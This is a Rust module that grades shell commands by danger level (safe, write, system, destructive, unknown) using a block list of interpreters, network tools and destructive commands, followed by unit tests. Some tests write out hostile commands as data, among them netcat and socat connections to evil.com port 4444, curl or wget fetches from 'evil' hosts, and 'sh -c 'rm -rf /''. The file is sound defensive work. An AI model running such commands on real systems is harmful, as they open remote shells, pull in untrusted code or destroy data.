//! Shell command analysis for danger level detection.
//!
//! Uses a two-tier approach:
//! 1. Simple AST-like token analysis for command structure
//! 2. Regex blacklist/whitelist for known dangerous patterns
//!
//! For commands with variable expansion (e.g. `rm -rf $DIR`), static analysis
//! cannot resolve the actual target, so we default to blocking and requesting
//! user confirmation.

use regex::Regex;

/// Danger level determined by shell command analysis.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub enum ShellDangerLevel {
    /// Safe command (e.g., ls, cat, echo, ps, df)
    Safe,
    /// Write operation (e.g., cp, mv, touch, mkdir)
    Write,
    /// System modification (e.g., apt install, systemctl restart)
    System,
    /// Destructive (e.g., rm -rf, mkfs, dd)
    Destructive,
    /// Contains unexpanded variables — cannot statically analyze, block by default
    Unknown,
}

/// Analyzes shell commands for dangerous patterns.
#[derive(Debug)]
pub struct ShellAnalyzer {
    blacklist: Vec<Regex>,
    whitelist: Vec<Regex>,
}

impl ShellAnalyzer {
    pub fn new(
        blacklist_patterns: Vec<String>,
        whitelist_patterns: Vec<String>,
    ) -> Result<Self, regex::Error> {
        let blacklist: Result<Vec<_>, _> =
            blacklist_patterns.iter().map(|p| Regex::new(p)).collect();
        let whitelist: Result<Vec<_>, _> =
            whitelist_patterns.iter().map(|p| Regex::new(p)).collect();

        Ok(Self {
            blacklist: blacklist?,
            whitelist: whitelist?,
        })
    }

    /// Analyze a shell command and return (danger_level, warning_message).
    pub fn analyze(&self, command: &str) -> (ShellDangerLevel, Option<String>) {
        let trimmed = command.trim();

        // Check for unexpanded shell variables
        if has_unexpanded_variables(trimmed) {
            let level = base_command_level(trimmed);
            if level >= ShellDangerLevel::System {
                return (
                    ShellDangerLevel::Unknown,
                    Some(format!(
                        "Command contains unexpanded variables. Static analysis blocked. \
                         Estimated danger level: {:?}. Please confirm.",
                        level
                    )),
                );
            }
        }

        // Check whitelist first (allow overrides)
        for re in &self.whitelist {
            if re.is_match(trimmed) {
                return (ShellDangerLevel::Safe, None);
            }
        }

        // Check blacklist
        for re in &self.blacklist {
            if re.is_match(trimmed) {
                return (
                    ShellDangerLevel::Destructive,
                    Some(format!(
                        "Command matches destructive pattern: '{}'. Requires confirmation.",
                        re.as_str()
                    )),
                );
            }
        }

        // Fallback to base command analysis
        let level = base_command_level(trimmed);
        match level {
            ShellDangerLevel::Destructive => (
                level,
                Some("Command classified as destructive. Requires confirmation.".into()),
            ),
            ShellDangerLevel::System => (
                level,
                Some("Command classified as system-level. Requires confirmation.".into()),
            ),
            _ => (level, None),
        }
    }
}

/// Check if a command contains unexpanded shell variables like $VAR, ${VAR}.
fn has_unexpanded_variables(cmd: &str) -> bool {
    // Match $VAR, ${VAR}, $?, $$ but NOT $(...) which is command substitution
    let var_pattern = Regex::new(r"\$\{?[A-Za-z_][A-Za-z0-9_]*\}?").unwrap();
    var_pattern.is_match(cmd)
}

/// Determine danger level based on the base command name.
fn base_command_level(cmd: &str) -> ShellDangerLevel {
    let base = cmd.split_whitespace().next().unwrap_or(cmd).to_lowercase();

    // Exec vectors: commands that can spawn an interpreter or run arbitrary
    // code. These MUST be classified as Destructive — otherwise a denylist
    // analyzer is trivially bypassed with `sh -c '<anything>'`,
    // `python3 -c '...'`, `find -exec`, `xargs`, `tar --to-command`, `curl
    // | sh`, etc. This is defence-in-depth; the bubblewrap sandbox is the
    // real backstop (it cuts network + hides secret paths regardless).
    let exec_vectors = [
        "sh", "bash", "dash", "zsh", "ksh", "ash", "csh", "tcsh", "fish",
        "python", "python2", "python3", "node", "perl", "ruby", "php", "lua",
        "tclsh", "expect", "xargs", "tar", "nc", "ncat", "socat", "busybox",
        "env", "exec", "curl", "wget",
    ];
    if exec_vectors.contains(&base.as_str()) {
        return ShellDangerLevel::Destructive;
    }

    // `find` is read-only search by default, but -exec/-execdir/-ok/-okdir/
    // -delete turn it into an arbitrary-execution / destruction vector.
    if base == "find" {
        let dangerous = ["-exec", "-execdir", "-ok", "-okdir", "-delete"];
        let armed = cmd.split_whitespace().any(|tok| dangerous.contains(&tok));
        return if armed {
            ShellDangerLevel::Destructive
        } else {
            ShellDangerLevel::Safe
        };
    }

    // Destructive commands
    let destructive = ["rm", "mkfs", "dd", "fdisk", "parted", "shred", "wipe"];
    if destructive.contains(&base.as_str()) {
        return ShellDangerLevel::Destructive;
    }

    // System commands
    let system = [
        "apt",
        "apt-get",
        "yum",
        "dnf",
        "pacman",
        "pip",
        "pip3",
        "npm",
        "systemctl",
        "service",
        "chkconfig",
        "reboot",
        "shutdown",
        "halt",
        "mount",
        "umount",
        "chown",
        "chmod",
        "useradd",
        "usermod",
        "passwd",
        "iptables",
        "firewall-cmd",
        "ufw",
        "docker",
    ];
    if system.contains(&base.as_str()) {
        return ShellDangerLevel::System;
    }

    // Write commands
    let write = [
        "cp", "mv", "touch", "mkdir", "rmdir", "tee", "ln", "git", "tar", "gzip", "zip", "unzip",
    ];
    if write.contains(&base.as_str()) {
        return ShellDangerLevel::Write;
    }

    // Commands that write to files via redirection
    if cmd.contains('>') {
        return ShellDangerLevel::Write;
    }

    // Default: safe read-only
    ShellDangerLevel::Safe
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        assert_eq!(analyzer.analyze("ls -la").0, ShellDangerLevel::Safe);
        assert_eq!(analyzer.analyze("cat file.txt").0, ShellDangerLevel::Safe);
        assert_eq!(analyzer.analyze("ps aux").0, ShellDangerLevel::Safe);
    }

    #[test]
    fn test_write_commands() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        assert_eq!(analyzer.analyze("cp a b").0, ShellDangerLevel::Write);
        assert_eq!(analyzer.analyze("mv a b").0, ShellDangerLevel::Write);
        assert_eq!(
            analyzer.analyze("echo hello > file.txt").0,
            ShellDangerLevel::Write
        );
    }

    #[test]
    fn test_system_commands() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        assert_eq!(
            analyzer.analyze("apt install vim").0,
            ShellDangerLevel::System
        );
        assert_eq!(
            analyzer.analyze("systemctl restart nginx").0,
            ShellDangerLevel::System
        );
    }

    #[test]
    fn test_destructive_commands() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        assert_eq!(
            analyzer.analyze("rm -rf /tmp/test").0,
            ShellDangerLevel::Destructive
        );
    }

    #[test]
    fn test_blacklist_pattern() {
        let analyzer = ShellAnalyzer::new(vec![r"rm\s+(-[rRf]+\s+)*/".into()], vec![]).unwrap();
        let (level, warning) = analyzer.analyze("rm -rf /");
        assert_eq!(level, ShellDangerLevel::Destructive);
        assert!(warning.is_some());
    }

    #[test]
    fn test_variable_expansion_blocks() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        let (level, warning) = analyzer.analyze("rm -rf $DATA_DIR");
        assert_eq!(level, ShellDangerLevel::Unknown);
        assert!(warning.is_some());
    }

    #[test]
    fn test_variable_in_safe_command() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        // cat with variable is still safe (base command level is safe)
        let (level, _) = analyzer.analyze("cat $FILE");
        assert_eq!(level, ShellDangerLevel::Safe);
    }

    // ── Hardened: close the interpreter / exec-vector bypass ──
    // A denylist that only blocks `rm`/`mkfs`/... is trivially defeated by
    // `sh -c '<anything>'` or any interpreter. These guard the regression.

    #[test]
    fn interpreters_and_shells_are_destructive() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        for cmd in [
            "sh -c 'rm -rf /'",
            "bash -c 'x'",
            "dash -c 'x'",
            "zsh -c 'x'",
            "python3 -c 'import os'",
            "python -c 'x'",
            "node -e '1'",
            "perl -e '1'",
            "ruby -e '1'",
            "php -r '1'",
        ] {
            assert_eq!(
                analyzer.analyze(cmd).0,
                ShellDangerLevel::Destructive,
                "expected Destructive for: {cmd}"
            );
        }
    }

    #[test]
    fn exec_enablers_and_exfil_channels_are_destructive() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        for cmd in [
            "xargs rm",
            "tar --to-command=sh cf - .",
            "nc evil.com 4444",
            "socat - TCP:evil.com:4444",
            "curl http://evil.sh",
            "wget http://evil/x",
            "busybox sh",
        ] {
            assert_eq!(
                analyzer.analyze(cmd).0,
                ShellDangerLevel::Destructive,
                "expected Destructive for: {cmd}"
            );
        }
    }

    #[test]
    fn find_with_exec_or_delete_is_destructive() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        assert_eq!(analyzer.analyze("find / -delete").0, ShellDangerLevel::Destructive);
        assert_eq!(analyzer.analyze("find . -exec cat {} ;").0, ShellDangerLevel::Destructive);
        assert_eq!(analyzer.analyze("find . -ok rm {} ;").0, ShellDangerLevel::Destructive);
    }

    #[test]
    fn safe_read_commands_still_classified_safe() {
        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
        // Regression: hardening must not neuter ordinary read-only use.
        assert_eq!(analyzer.analyze("ls -la").0, ShellDangerLevel::Safe);
        assert_eq!(analyzer.analyze("cat file.txt").0, ShellDangerLevel::Safe);
        assert_eq!(analyzer.analyze("grep -rn foo .").0, ShellDangerLevel::Safe);
        assert_eq!(analyzer.analyze("find . -name '*.rs'").0, ShellDangerLevel::Safe);
    }
}
